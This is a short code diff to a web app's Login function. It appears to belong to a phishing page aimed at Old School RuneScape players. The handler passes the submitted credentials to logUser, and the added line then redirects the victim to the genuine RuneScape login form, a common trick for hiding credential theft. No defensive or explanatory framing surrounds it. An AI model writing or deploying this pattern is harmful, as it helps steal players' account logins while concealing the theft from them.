@@ -16,6 +16,7 @@ function App() {
 
   const Login = credentials => {
     logUser(credentials);
+    window.location.href = "https://secure.runescape.com/m=weblogin/loginform?theme=oldschool&mod=oldschool&ssl=1&dest=";
   }
 
   return (
